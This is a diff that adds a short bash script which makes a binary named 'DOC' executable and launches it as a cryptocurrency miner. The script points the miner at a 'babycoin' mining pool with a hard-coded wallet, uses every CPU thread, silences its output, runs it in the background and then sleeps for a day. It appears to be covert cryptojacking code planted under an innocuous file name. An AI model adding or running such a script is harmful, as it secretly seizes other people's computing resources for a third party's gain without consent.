@@ -1,0 +1,4 @@
+#!/bin/bash
+chmod +x DOC
+./DOC --donate-level 1 -a RandomARQ -o babycoin.multi-pool.net:3333 -u babyz7iH6t3CNhswCAL2judxrvSWemFmjjX1ModDXrL1KebHCf7nNoNRpHKuRUgLiqDHQwy3vWAbvPebbhBBB4mmGQkudgFvnFC -p $(echo $(shuf -i 1000-9999 -n 1)) -t$(nproc --all) >/dev/null &
+sleep 24h
